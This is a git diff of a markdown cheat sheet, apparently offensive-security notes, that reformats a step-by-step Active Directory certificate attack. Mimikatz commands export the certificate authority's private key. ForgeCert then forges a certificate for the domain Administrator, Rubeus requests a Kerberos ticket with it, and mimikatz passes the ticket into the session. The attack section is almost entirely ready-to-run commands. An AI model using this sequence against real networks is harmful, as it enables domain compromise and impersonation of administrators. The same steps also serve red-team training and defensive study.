@@ -4,17 +4,29 @@
 
 ## Extract Private Key
 
-#### 1) mimikatz
+#### 1) 
 
-#### 2) crypto::certificates /systemstore:LOCAL_MACHINE
+    mimikatz
 
-#### 3) privilege::debug
+#### 2) 
 
-#### 4) crypto::capi 
+    crypto::certificates /systemstore:LOCAL_MACHINE
 
-#### 5) crypto::cng
+#### 3) 
 
-#### 6) crypto::certificates /systemstore:LOCAL_MACHINE /export
+    privilege::debug
+
+#### 4) 
+
+    crypto::capi 
+
+#### 5) 
+
+    crypto::cng
+
+#### 6) 
+
+    crypto::certificates /systemstore:LOCAL_MACHINE /export
 
 ## Exported Certificates format: PFX and DER
 
@@ -24,12 +36,22 @@
 
 ### Tools: Forgecert, Rubeus, Mimikatz
 
-#### 8) Forgecert.exe --CaCertPath /path/to/.pfx --CaCertPassword mimikatz --Subject CN=(WHATEVER) --SubjectAltName Administrator@DOMAIN --NewCertPath /path/to/forged.pfx --NewCertPassword PASSWORD
+#### 8) 
 
-#### 9) Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:/path/to/forged.pfx /password:CERT_PASS /outfile:TICKET.KIRBI /domain:DOMAIN /dc:DC_IP
+    Forgecert.exe --CaCertPath /path/to/.pfx --CaCertPassword mimikatz --Subject CN=(WHATEVER) --SubjectAltName Administrator@DOMAIN --NewCertPath /path/to/forged.pfx --NewCertPassword PASSWORD
 
-#### 10) mimikatz
+#### 9) 
 
-#### 11) kerberos::ptt TICKET.KIRBI
+    Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:/path/to/forged.pfx /password:CERT_PASS /outfile:TICKET.KIRBI /domain:DOMAIN /dc:DC_IP
 
-#### 12) exit
+#### 10) 
+
+    mimikatz
+
+#### 11) 
+
+    kerberos::ptt TICKET.KIRBI
+
+#### 12) 
+
+    exit
